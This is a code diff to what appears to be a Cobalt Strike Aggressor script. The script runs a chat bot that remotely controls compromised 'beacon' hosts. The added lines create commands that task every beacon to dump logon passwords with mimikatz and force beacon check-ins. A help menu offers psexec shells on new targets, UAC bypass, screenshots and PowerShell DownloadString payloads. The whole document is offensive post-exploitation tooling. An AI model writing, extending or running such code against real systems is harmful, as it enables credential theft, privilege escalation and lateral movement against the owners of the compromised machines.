@@ -32,6 +32,7 @@ sub elevateAll {
     }
 }
 
+# Get PowerShell DownloadString payload
 sub getDownloadString {
     foreach $s (sites()) {
         # Check if the site has powershell in the description
@@ -49,6 +50,7 @@ sub getDownloadString {
     return false;
 }
 
+# Create PowerShell DownloadString payload
 sub createDownloadString {
     local ('$listener $script $host $url');
 
@@ -95,6 +97,7 @@ on event_public {
         }
         # List all beacons by ID
         else if ($cmd eq "!beacons") {
+            say ("Number of Beacons: " . size(beacons()));
             foreach $b (beacons()) {
                 say("Beacon: $b['id'] on $b['computer'] as $b['user']");
             }
@@ -142,6 +145,28 @@ on event_public {
 
                 createDownloadString($listener);
             }
+        }
+        else if ($cmd eq "!checkin") {
+            foreach $b (beacons()){
+                bcheckin($b['id']);
+            }
+        }
+        else if ($cmd eq "!mimikatz") {
+            foreach $b (beacons()) {
+                blogonpasswords($b['id']);
+            }
+        }
+        else if ($cmd eq "!help") {
+            say("Beep boop! Here are my commands:");
+            say("ping:\t\t\tPong!");
+            say("beacons:\t\t\tList all beacons.");
+            say("listeners:\t\t\tList all listeners.");
+            say("psexec <bid> <target> <listener>:\tSpawn a shell on <target> from <bid>.");
+            say("elevate:\t\t\tAttempt to bypass UAC on all non-admin beacons.");
+            say("screenshot:\t\t\tAttempt to screenshot all beacons.");
+            say("downloadstring:\t\t\tGet a Powershell DownloadString payload.");
+            say("checkin:\t\t\tAsk all beacons to checkin.");
+            say("mimikatz:\t\t\tTask all beacons to run logonpasswords.");
         }
     }
 }
